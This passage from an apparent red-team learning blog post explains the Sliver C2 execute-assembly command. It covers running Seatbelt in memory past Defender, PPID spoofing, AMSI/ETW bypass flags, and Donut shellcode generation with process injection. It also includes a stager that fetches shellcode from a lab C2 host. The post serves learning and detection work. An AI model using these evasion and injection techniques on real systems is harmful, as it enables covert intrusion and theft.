+#######%##########%#########  %%%......  ...   ..         @////(((&amp;%%%%%#########################(#(#######((#####
+###%##%%####################  &amp;%%...............          @////(((&amp;%%%%%%%%##############%#######(#########((#####
+#####%######################  %%%..                       @////(((&amp;%%%%%%%################                        
+                        &amp;%&amp;   %%%%%      Seatbelt         %////(((&amp;%%%%%%%%#############*                         
+                        &amp;%%&amp;&amp;&amp;%%%%%        v1.2.1         ,(((&amp;%%%%%%%%%%%%%%%%%,                                 
+                         #%%%%##,                                                                                 
+
+
+====== AMSIProviders ======
+
+  GUID                           : {2781761E-28E0-4109-99FE-B9D127C57AFE}
+  ProviderPath                   : &#34;C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2209.7-0\MpOav.dll&#34;
+
+====== AntiVirus ======
+
+  Engine                         : Windows Defender
+  ProductEXE                     : windowsdefender://
+  ReportingEXE                   : %ProgramFiles%\Windows Defender\MsMpeng.exe
+
+====== AppLocker ======
+
+  [*] AppIDSvc service is Stopped
+...
+</code></pre><p>The command succeeded out of the box with Defender enabled.
+This is the nice thing about in-memory execution I assume.
+Write Seatbelt to disk without customizing it first and AV will have no problem catching it.
+Write it to memory instead, execute it from there and it is much harder to catch.
+Both Seatbelt and Donut (what Sliver used to make shellcode out of Seatbelt) are around 4 years old,
+Sliver itself about 3, and all of them are publicly available on GitHub, yet it still seems hard to catch this with AV.
+I found it somewhat surprising that I had to customize nothing to get this working.</p>
+<p>Seatbelt takes a while to run, and if you spend that time looking at Process Hacker instead of picking you nose
+then you will see that the whole thing is far from invisible.
+If you double-click a process in Process Hacker you get a properties window with all the details about it.
+There are multiple tabs for things like performance statistics, threats and the memory and much more.
+Open the one for the &ldquo;calc.exe&rdquo; process started by <code>execute-assembly</code> and you will also find a tab dedicated to
+.NET assemblies (curiously it does not appear if you launch the Calculator in a normal way).
+Below is a screenshot of this tab which I took while Seatbelt ran.
+It displayed the version of the Common Language Runtime (CLR), which is .NET&rsquo;s equivalent of the
+Java Virtual Machine (JVM). It also showed a number of application domains, which are isolated compartments
+within a process that can each host a .NET application.
+Interestingly, one of these application domains consisted of a bunch of DLLs and something called &ldquo;Seatbelt&rdquo;,
+and nobody cared:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/32_sliver_c2_execute_assembly/process_hacker_shows_seatbelt_application_domain.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>The application domain Seatbelt runs in can be seen in Process Hacker</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Anyways, more on detection later and back to what we did this for (the Seatbelt results).
+Note that I&rsquo;ve used the <code>--loot</code> argument together with <code>--name seatbelt</code>.
+This ensures the output is saved to the C2 server database so that any operator can look it up.
+Run <code>loot</code> to list all loot files you captured so far or <code>loot fetch</code> to select one for display.
+You find it under the short name &ldquo;seatbelt&rdquo;.
+The file name is auto-generated and made up of the command you used, the hostname, the executable&rsquo;s name
+and a timestamp:</p>
+<pre tabindex="0"><code>sliver (LIABLE_EX-WIFE) &gt; loot 
+
+Type  Name      File Name                                                     UUID                                  
+====  ====      =========                                                     ====                                  
+File  seatbelt  execute-assembly_DESKTOP-2CNJ1IR_Seatbelt_20221026192546.log  0a9caefb-96f5-4f69-8d72-8ce7f668918a  
+
+sliver (LIABLE_EX-WIFE) &gt; loot fetch 
+
+? Select a piece of loot: seatbelt  execute-assembly_DESKTOP-2CNJ1IR_Seatbelt_20221026192546.log  LOOT_FILE  0a9caefb-96f5-4f69-8d72-8ce7f668918a  
+
+File Name: execute-assembly_DESKTOP-2CNJ1IR_Seatbelt_20221026192546.log
+
+
+
+                        %&amp;&amp;@@@&amp;&amp;                                                                                  
+                        &amp;&amp;&amp;&amp;&amp;&amp;&amp;%%%,                       #&amp;&amp;@@@@@@%%%%%%###############%                         
+                        &amp;%&amp;   %&amp;%%                        &amp;////(((&amp;%%%%%#%################//((((###%%%%%%%%%%%%%%%
+%%%%%%%%%%%######%%%#%%####%  &amp;%%**#                      @////(((&amp;%%%%%%######################(((((((((((((((((((
+#%#%%%%%%%#######%#%%#######  %&amp;%,,,,,,,,,,,,,,,,         @////(((&amp;%%%%%#%#####################(((((((((((((((((((
+#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&amp;%%%%%%%######################(#(((#(#((((((((((
+#####%%%####################  &amp;%%......  ...   ..         @////(((&amp;%%%%%%%###############%######((#(#(####((((((((
+#######%##########%#########  %%%......  ...   ..         @////(((&amp;%%%%%#########################(#(#######((#####
+###%##%%####################  &amp;%%...............          @////(((&amp;%%%%%%%%##############%#######(#########((#####
+#####%######################  %%%..                       @////(((&amp;%%%%%%%################                        
+                        &amp;%&amp;   %%%%%      Seatbelt         %////(((&amp;%%%%%%%%#############*                         
+                        &amp;%%&amp;&amp;&amp;%%%%%        v1.2.1         ,(((&amp;%%%%%%%%%%%%%%%%%,                                 
+                         #%%%%##,
+...
+</code></pre><p>If you don&rsquo;t want to use the loot feature, you can also pass <code>--save</code>
+to save the output to a local file (stored in <code>/tmp</code>).</p>
+<p>This was how to run Seatbelt in a sacrificial process.
+In the beginning, I mentioned that running it in-process is possible too.
+Instead of passing <code>--process &lt;process_name&gt;</code> you can pass <code>--in-process</code>
+and the assembly will run within the process hosting your implant.
+It works as follows:</p>
+<pre tabindex="0"><code>sliver (LIABLE_EX-WIFE) &gt; execute-assembly --in-process --loot --name seatbelt-inproc /tmp/ghostpack/Seatbelt.exe -group=user
+
+[*] Tasked beacon LIABLE_EX-WIFE (50c194a1)
+
+[+] LIABLE_EX-WIFE completed task 50c194a1
+
+[*] Output:
+
+
+                        %&amp;&amp;@@@&amp;&amp;                                                                                  
+                        &amp;&amp;&amp;&amp;&amp;&amp;&amp;%%%,                       #&amp;&amp;@@@@@@%%%%%%###############%                         
+                        &amp;%&amp;   %&amp;%%                        &amp;////(((&amp;%%%%%#%################//((((###%%%%%%%%%%%%%%%
+%%%%%%%%%%%######%%%#%%####%  &amp;%%**#                      @////(((&amp;%%%%%%######################(((((((((((((((((((
+#%#%%%%%%%#######%#%%#######  %&amp;%,,,,,,,,,,,,,,,,         @////(((&amp;%%%%%#%#####################(((((((((((((((((((
+#%#%%%%%%#####%%#%#%%#######  %%%,,,,,,  ,,.   ,,         @////(((&amp;%%%%%%%######################(#(((#(#((((((((((
+#####%%%####################  &amp;%%......  ...   ..         @////(((&amp;%%%%%%%###############%######((#(#(####((((((((
+#######%##########%#########  %%%......  ...   ..         @////(((&amp;%%%%%#########################(#(#######((#####
+###%##%%####################  &amp;%%...............          @////(((&amp;%%%%%%%%##############%#######(#########((#####
+#####%######################  %%%..                       @////(((&amp;%%%%%%%################                        
+                        &amp;%&amp;   %%%%%      Seatbelt         %////(((&amp;%%%%%%%%#############*                         
+                        &amp;%%&amp;&amp;&amp;%%%%%        v1.2.1         ,(((&amp;%%%%%%%%%%%%%%%%%,                                 
+                         #%%%%##,
+</code></pre><p>As you can see, Seatbelt ran again.
+To confirm that it ran within the implant process this time, I had a close look at Process Hacker.
+And indeed, a .NET application domain similar to the one seen before in &ldquo;calc.exe&rdquo; now appeared
+in &ldquo;msedge.exe&rdquo;, the process I ran my implant in:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/32_sliver_c2_execute_assembly/seatbet_assembly_showing_up_in_edge.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>The application domain with Seatbelt inside can now be seen within the MS Edge process in Process Hacker</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>A word of caution: this was not the only time I used the in-process version of <code>execute-assembly</code>
+but it was one of the rare occasions at which it did not crash the process my precious implant was running in.
+Most of the time Edge (or other processes like Notepad) just died when I tried this.
+I could not really figure out why and disabling Defender did not make it better.
+Maybe its Seatbelt, the VM config or perhaps the problem is just me.</p>
+<p>Since you will loose the implant when this happens my recommendation would be to think twice before
+using <code>--in-process</code>. Do you have a second backup implant? Is it fine if the current process of your implant dies?
+Nobody will notice and nothing important will break? Then go ahead and give it a go.
+If not, go for the sacrificial process. That one worked like a charm each time and if it ever doesn&rsquo;t
+then your implant will survive the fallout of the crash.
+Sadly though, there are also <a href="https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/">good arguments</a>
+against that since it could be easier to detect (see also end of this post).</p>
+<p>There is also another downside when using the sacrificial process.
+Since it is using the Donut loader the command inherits the limitation that process arguments cannot be longer than 256 characters.
+To illustrate, I wrote a small assembly that accepts a single argument and prints it in a message box (details are pretty boring).
+If you run it with <code>execute-assembly</code> and pass a very long argument, Sliver warns you about the limit but you can proceed.
+This is an excerpt from the console, where I passed a very long numeric string with &gt;1000 characters and then accepted the warning:</p>
+<pre tabindex="0"><code>...
+789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789
+
+⚠   Injected .NET assembly arguments are limited to 256 characters when using the default fork/exec model.
+Consider using the --in-process flag to execute the .NET assembly in-process and work around this limitation.
+? Do you want to continue? Yes
+...
+</code></pre><p>The assembly actually ran but it apparently had its arguments truncated:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/32_sliver_c2_execute_assembly/arguments_truncated_by_donut.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>The assembly ran but the argument was truncated</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>This already concludes the user perspective on this command.
+It does what it says it does, which is running your .NET assemblies on the target machine.
+To wrap up this part, here is a short overview of the arguments and flags:</p>
+<pre tabindex="0"><code>sliver (LIABLE_EX-WIFE) &gt; execute-assembly --help
+
+Command: execute-assembly [local path to assembly] [arguments]
+About: (Windows Only) Executes the .NET assembly in a child process.
+
+
+Usage:
+======
+  execute-assembly [flags] filepath [arguments...]
+
+Args:
+=====
+  filepath   string         path the assembly file
+  arguments  string list    arguments to pass to the assembly entrypoint (default: [])
+
+Flags:
+======
+  -M, --amsi-bypass                 Bypass AMSI on Windows (only supported when used with --in-process)
+  -d, --app-domain        string    AppDomain name to create for .NET assembly. Generated randomly if not set.
+  -a, --arch              string    Assembly target architecture: x86, x64, x84 (x86+x64) (default: x84)
+  -c, --class             string    Optional class name (required for .NET DLL)
+  -E, --etw-bypass                  Bypass ETW on Windows (only supported when used with --in-process)
+  -h, --help                        display help
+  -i, --in-process                  Run in the current sliver process
+  -X, --loot                        save output as loot
+  -m, --method            string    Optional method (a method is required for a .NET DLL)
+  -n, --name              string    name to assign loot (optional)
+  -P, --ppid              uint      parent process id (optional) (default: 0)
+  -p, --process           string    hosting process to inject into (default: notepad.exe)
+  -A, --process-arguments string    arguments to pass to the hosting process
+  -r, --runtime           string    Runtime to use for running the assembly (only supported when used with --in-process)
+  -s, --save                        save output to file
+  -t, --timeout           int       command timeout in seconds (default: 60)
+</code></pre><p>To structure all these flags, think of them the following way.
+First, there are two different ways in which .NET assemblies get executed:</p>
+<ul>
+<li>Sacrificial process: you pass a process name with <code>--process</code> and optionally specify <code>--process arguments</code> for it.
+With <code>--ppid</code> you can spoof the parent process relationship for better stealth.
+Use <code>--arch</code> to specify the target architecture, but by default both are supported anyways (x84).
+If you don&rsquo;t like the randomly generated application domain name, choose one with <code>--app-domain</code>.</li>
+<li>In-process execution: you pass <code>--in-process</code> to enable it. No further choices are required.
+However, you can optionally define a .NET runtime version with <code>--runtime</code> and you can also
+use an <code>--amsi-bypass</code> and <code>--etw-bypass</code> as the help text suggests.
+Although not explicitly mentioned above, you application domain name will not be random.
+Sliver will silently ignore the argument and use the &ldquo;DefaultDomain&rdquo;.</li>
+</ul>
+<p>Second, the command can execute two different kinds of assemblies for you:</p>
+<ul>
+<li>Executables (EXEs): they have a well-defined entry point but you can specify custom arguments
+simply by appending them to the assembly file path as usual in a command prompt.</li>
+<li>Shared Libraries (DLLs): to define what shall be executed, choose a <code>--class</code> and (static) <code>--method</code>.
+Possible arguments are appended at the end, as before.</li>
+</ul>
+<p>Third, your choices regarding the output are:</p>
+<ul>
+<li>Save as loot: pass <code>--loot</code> to enable and define a <code>--name</code> for the output.</li>
+<li>Save to disk: enable with <code>--save</code></li>
+<li>Just watch: don&rsquo;t set any of these flags and you just get the output printed out.</li>
+</ul>
+<h2 id="implementation-details">Implementation details</h2>
+<h3 id="sliver-source-code">Sliver source code</h3>
+<p>All of this feels a little bit too magical to me when I use it.
+The beauty of open-source software is that it does not have to be like that since you can read the code.
+Let&rsquo;s go through the implementation to find out what&rsquo;s going on.
+All paths I mention below are relative to the root of the <a href="https://github.com/BishopFox/sliver">Sliver GitHub repo</a>
+and based on <code>v1.5.30</code>.</p>
+<p>Commands you launch when connecting to Sliver with the official client
+start with a command handler.
+The one for <code>execute-assembly</code> is called
+<a href="https://github.com/BishopFox/sliver/blob/v1.5.30/client/command/exec/execute-assembly.go">ExecuteAssemblyCmd</a>
+located in file <code>client/command/exec/execute-assembly.go</code>.
+The handler&rsquo;s responsibility is mainly parsing arguments and preparing an RPC call to the server.
+In this case it also reads the local assembly file and sends it over.
+Nothing special to see here.</p>
+<p>On the server, there is an RPC handler called
+<a href="https://github.com/BishopFox/sliver/blob/v1.5.30/server/rpc/rpc-tasks.go#L129">ExecuteAssembly</a>
+located in <code>server/rpc/rpc-tasks.go</code> which processes the request.
+It uses a function <a href="https://github.com/BishopFox/sliver/blob/v1.5.30/server/generate/donut.go#L57">DonutFromAssembly</a>
+to turn the assembly into shellcode.
+This function is a wrapper around the <a href="https://github.com/Binject/go-donut">go-donut</a>
+library, which is a Go-based generator for <a href="https://github.com/TheWover/donut">Donut</a> shellcode.</p>
+<p>The RPC handler then dispatches one of two possible requests to the implant.
+If <code>--in-process</code> was specified, it sends an <code>InvokeInProcExecuteAssemblyReq</code> request,
+else an <code>InvokeExecuteAssemblyReq</code> request.
+Note that for in-process execution it does not send the shellcode previously generated
+but instead the raw bytes of the assembly.</p>
+<p>Both RPC handlers of the implant are defined in <code>implant/sliver/handlers/handlers_windows.go</code>
+<a href="https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/handlers/handlers_windows.go#L242">here</a>
+and <a href="https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/handlers/handlers_windows.go#L221">here</a>.
+They just unmarshal the requests and delegate the work to the implant&rsquo;s <code>taskrunner</code> package.</p>
+<p>This package provides two functions.
+For in-process execution, there is
+<a href="https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/taskrunner/task_windows.go#L275">InProcExecuteAssembly</a>.
+Effectively, it relies on <a href="https://github.com/Ne0nd0g/go-clr">github.com/Ne0nd0g/go-clr</a>
+which seems to be a re-implementation of the Donut loader written entirely in Go.
+Unlike the original Donut, it should be able to handle more than 256 characters of process arguments.
+Read more about the painful journey of go-clr&rsquo;s development in this
+<a href="https://blog.ropnop.com/hosting-clr-in-golang/">blog post</a>.
+Also not that this function can optionally patch AMSI and ETW (which I won&rsquo;t discuss here).</p>
+<p>For execution in a sacrificial process, there is the
+<a href="https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/taskrunner/task_windows.go#L293">ExecuteAssembly</a>
+function. It spawns the new process and then injects the shellcode into it.
+To be more concrete, there are the following steps:</p>
+<ul>
+<li>With <a href="https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/taskrunner/task_windows.go#L452">startProcess</a>
+a new process is created using Go&rsquo;s <code>os/exec</code> library.
+This includes PPID spoofing done with
+<a href="https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/spoof/spoof_windows.go">SpoofParent</a>.</li>
+<li>What follows are a few lines
+(starting at <a href="https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/taskrunner/task_windows.go#L309">line 309</a>
+down to 328) that may look strange at first sight.
+Initially we get a handle to the new process with <code>PROCESS_DUP_HANDLE</code> access right,
+then one to the &ldquo;current process&rdquo; which is in fact something called a pseudo handle
+(defined <a href="https://github.com/BishopFox/sliver/blob/v1.5.30/implant/vendor/golang.org/x/sys/windows/syscall_windows.go#L455">here</a>,
+see also
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess">GetCurrentProcess</a>).
+These are used as arguments in a call of
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-duplicatehandle">DuplicateHandle</a>,
+which effectively seems to create another handle to the new process, but this time with <code>PROCESS_ALL_ACCESS</code> rights.
+I&rsquo;ll quickly summarize why I believe this is so.
+These are the arguments in the Go code:
+<code>windows.DuplicateHandle(handle, currentProcHandle, currentProcHandle, &amp;lpTargetHandle, 0, false, syscalls.DUPLICATE_SAME_ACCESS)</code>.
+DuplicateHandle takes a handle from a source process and creates a duplicate of it in a target process.
+As source process (1st argument), we pass the <code>handle</code> to the new process,
+and the handle we want duplicated (2nd argument) is <code>currentProcHandle</code>, the current process pseudo handle.
+In the context of the new process it will resolve to a handle to the new process.
+As target process (3rd argument), we also pass <code>currentProcHandle</code>, but in this context it resolves to the process of the implant.
+The 4th argument <code>lpTargetHandle</code> is just the location in the target process where the duplicate will be made available.
+And now comes the magic. What happens if you duplicate this pseudo handle (while requesting <code>DUPLICATE_SAME_ACCESS</code> rights)?
+According to the big yellow warning in the Microsoft documentation on
+<a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights">process security and access rights</a>
+you will get (real) handle with maximum access.
+So in the end this seems to just be a way to request a lot of access rights without explicitly saying so.</li>
+<li>With the handle available, the implant uses it to call <a href="https://github.com/BishopFox/sliver/blob/v1.5.30/implant/sliver/taskrunner/task_windows.go#L66">injectTask</a>.
+It uses a few Windows API functions to write shellcode to the memory of the new process and execute it.
+These functions are
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex">VirtualAllocEx</a>,
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory">WriteProcessMemory</a>,
+<a href="https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotectex">VirtualProtectEx</a>
+and <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread">CreateRemoteThread</a>.
+I&rsquo;ve discussed in <a href="../../post/learning_sliver_c2_06_stagers_process_injection/">post 7</a>
+how this works and won&rsquo;t it again here.</li>
+</ul>
+<p>This is mostly it.
+Now only one mystery should be left.
+How does the shellcode or the <code>go-clr</code> library manage to start a .NET assembly?
+Well, <a href="https://github.com/thewover/donut">Donut</a>
+is a huge project and discussing every detail would be a bit too much.
+To start gently and get at least a glimpse of it, I&rsquo;ll proceed below with a short
+demo of how to use Donut to reproduce what <code>execute-assembly</code> does.
+After that I&rsquo;ll also give you a starting point for deeper Donut investigations.</p>
+<h3 id="using-donut-manually">Using Donut manually</h3>
+<p>Let&rsquo;s perform the individual steps manually now to get a better understanding of the technical details.
+In a nutshell, all we have to do is turn some assembly into Donut shellcode and inject that into a process.
+Should be a piece of cake.</p>
+<p>Start with the assembly.
+To keep it simple, I made it such that all it does is to create some undeniable evidence that it runs.
+It does that by showing a message box with the PID if of the current process inside.
+Find the code below.
+You can put it into a Visual Studio project called <code>LibMBox</code> based on the template &ldquo;Class Library (.NET Framework)&rdquo;:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c#" data-lang="c#"><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Diagnostics;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">using</span> System.Runtime.InteropServices;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MyClass</span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">    [DllImport(&#34;user32.dll&#34;, CharSet = CharSet.Unicode, SetLastError = true)]</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">extern</span> <span style="color:#66d9ef">int</span> MessageBox(IntPtr hWnd, <span style="color:#66d9ef">string</span> lpText, <span style="color:#66d9ef">string</span> lpCaption, <span style="color:#66d9ef">uint</span> uType);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> RunMyCode()
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> pid = Process.GetCurrentProcess().Id;
+</span></span><span style="display:flex;"><span>        MessageBox(IntPtr.Zero, <span style="color:#e6db74">&#34;Hello from process &#34;</span> + pid.ToString(), <span style="color:#e6db74">&#34;Injected&#34;</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>When you have your project created and built, it should look roughly as seen below.
+The compiler should have created a DLL called <code>LibMBox.dll</code> for you,
+the path to which you find in the output window in the bottom:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/32_sliver_c2_execute_assembly/building_test_assembly.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Building the test assembly</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Now transfer this DLL over to your C2 server, where we will prepare the shellcode.
+The Go port of Donut used by Sliver is not just a library but provides a CLI too.
+You find the repository at <a href="https://github.com/Binject/go-donut">github.com/Binject/go-donut</a>),
+so you can install it with the following command:</p>
+<pre tabindex="0"><code>go install github.com/Binject/go-donut@67a31e2d883eba5a995eff2dc2a5dba2c7f123ad
+</code></pre><p>The hash behind the <code>@</code> defines the exact git hash of the version we install.
+At first I just used <code>@latest</code> to get the current master but shellcode created with that
+version crashed in all of my attempts.
+Fortunately its possible to look up the version Sliver uses in the
+<a href="https://github.com/BishopFox/sliver/blob/v1.5.30/go.mod#L11">go.mod</a> file.
+Using this version made all my problems disappear.</p>
+<p>Note that Sliver prepends 8 additional bytes to the <code>go-donut</code> shellcode
+(<a href="https://github.com/BishopFox/sliver/blob/v1.5.30/server/generate/donut.go#L85">here</a>).
+For me it worked with and without those bytes, so I won&rsquo;t add them here.</p>
+<p>Eventually, this is how I used <code>go-donut</code> to get the shellcode:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[/tmp/donut]
+└─$ ~/go/bin/go-donut --in /tmp/donut/LibMBox.dll --out /tmp/donut/mboxshellcode.bin --arch x64 --class MyClass --method RunMyCode
+2022/10/28 22:46:33 Done!
+                                                                                                                                
+┌──(kali㉿kali)-[/tmp/donut]
+└─$ cat mboxshellcode.bin | head -c 64 | xxd
+00000000: e880 2500 0080 2500 001d 3cc2 617d 3051  ..%...%...&lt;.a}0Q
+00000010: 37eb 1654 126d 0b2b beae 7258 057f 842a  7..T.m.+..rX...*
+00000020: 891e 3f65 677d 25f5 7e00 0000 001b 4dd3  ..?eg}%.~.....M.
+00000030: b96d 9a09 ee97 0cfd af5b b7a5 2df1 609e  .m.......[..-.`.
+</code></pre><p>My C2 server has an Apache running on port 8080, where I hosted this shellcode.
+After that, I switched back to the Windows target.</p>
+<p>All we have to do on the Windows target now is to download and execute the shellcode.
+Sounds familiar?
+Yes, because that&rsquo;s what we did in those two posts about stagers.
+The only difference here is that we want to swap out the Sliver implant shellcode
+and use the one generated above instead.</p>
+<p>You can find the original stager in <a href="../../post/learning_sliver_c2_06_stagers_process_injection#appendix">post 7</a>.
+Its functionality in one sentence: it downloads shellcode via HTTP,
+then injects it into a process with <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.
+To make it use our new shellcode, we have to point it to <code>http://sliver.labnet.local:8080/mboxshellcode.bin</code>.
+All I changed about the original code was the following two things:</p>
+<ul>
+<li>change port from <code>80</code> to <code>8080</code></li>
+<li>change the filename from <code>fontawesome.woff</code> to <code>mboxshellcode.bin</code></li>
+</ul>
+<p>The following screenshot highlights those changes in the code and shows what happened
+when I executed it (don&rsquo;t forget to also launch notepad.exe):</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/32_sliver_c2_execute_assembly/inject_shellcode_libmbox.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Injecting the shellcode with the stager</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>As you can see, a message box appeared which had the PID of the notepad.exe process inside.
+This confirms that the .NET DLL actually ran within the notepad process.</p>
+<p>Of course we can also run the test assembly with <code>execute-assembly</code> itself.
+This is how to do it:</p>
+<pre tabindex="0"><code>sliver (FULL_RAG) &gt; execute-assembly --process calc.exe --ppid 4824 --class MyClass --method RunMyCode /tmp/donut/LibMBox.dll
+
+[*] Tasked beacon FULL_RAG (837070d0)
+
+[+] FULL_RAG completed task 837070d0
+
+[*] Output:
+</code></pre><p>As can be seen below, a new <code>calc.exe</code> process and the message box appeared.</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/32_sliver_c2_execute_assembly/run_mboxdll_with_implant.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Running the message box test assembly with Sliver</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
+    transition: filter 400ms, -webkit-filter 400ms;
+  }
+  .blur-up.lazyloaded {
+    -webkit-filter: blur(0);
+    filter: blur(0);
+  }
+</style>
+
+<p>Ok, this was process injection, the stuff we already know a bit about.
+But there is still the shellcode that just pops out of this tool.
+How does it work?</p>
+<h3 id="inside-donut">Inside Donut</h3>
+<p>Well, to me Donut looks quite complicated.
+You can find a lot of information on its design in blog posts of
+<a href="https://thewover.github.io/Introducing-Donut/">TheWover</a>
+and <a href="https://modexp.wordpress.com/2019/05/10/dotnet-loader-shellcode/">Odzhan</a>
+and if questions are left open, there is always <a href="https://github.com/TheWover/donut">the code</a>.</p>
+<p>I quickly mention a few of Donut&rsquo;s features here only to ignore them afterwards:</p>
+<ul>
+<li>Shellcode encryption: the goal here is to run a known evil assembly like Seatbelt,
+so it is wise to keep it encrypted until the very last moment.
+Donut does this for you with a pretty exotic but simple cipher called &ldquo;Chaskey&rdquo;.</li>
+<li>API hashing: Donut has to use a few characteristic Windows APIs and it would often be a dead giveaway
+for malicious activity if they appeared anywhere.
+Donut uses a trick to avoid that. It stores a (randomized) hash of these APIs
+and resolves them at runtime by comparing the hashes of existing APIs it finds on the system
+until a match is found. This way the actual names are obscured.</li>
+<li>AMSI bypass: Windows these days has something called the Antimalware Scanning Interface (AMSI),
+which is an API with which programs can send content to an AV while running
+(read more <a href="https://redcanary.com/blog/amsi/">here</a>).
+To avoid that AMSI sends the .NET assembly Donut loads to an AV,
+Donut&rsquo;s creators added a few AMSI bypasses (<a href="https://thewover.github.io/Apple-Fritter/#amsi-patching">post</a>).</li>
+</ul>
+<p>I know what you are thinking: this guy writes about everything except how Donut executes an assembly
+from memory. So let&rsquo;s finally look if we can find out what Donut does.
+To do so, clone the original <a href="https://github.com/TheWover/donut">Donut git repository</a> to your Windows machine
+(I cloned to <code>C:\playground\donut</code>).
+We will now build Donut in debug mode, which means you can use it locally and it will print out extensive logs.
+Read the
+<a href="https://github.com/TheWover/donut/blob/master/docs/devnotes.md#12-debugging-the-generator-and-loader">Donut devnotes</a>
+for more information on how to compile,
+or just follow along.
+The plan is: we compile Donut, use <code>donut.exe</code> to create a &ldquo;Donut instance&rdquo; for the Seatbelt assembly,
+and run this instance with <code>loader.exe</code>.</p>
+<p>Start with compiling the code.
+In Windows, open &ldquo;x64 Native Tools Command Prompt for VS 2022&rdquo; and go to the folder to which you cloned Donut.
+In there, run <code>nmake debug -f Makefile.msvc</code>.
+Donut should now be built:</p>
+
+
+
+
+
+
+
+
+
+
+
+<figure>
+  
+    
+      <img class="lazyload" data-src="/img/32_sliver_c2_execute_assembly/compiling_donut_debug_mode.png"  />
+    
+  
+  
+  <figcaption>
+    <header><b>Compiling Donut in debug mode</b></header>
+    
+  </figcaption>
+  
+</figure>
+<style media="screen">
+  .blur-up {
+    -webkit-filter: blur(5px);
+    filter: blur(5px);
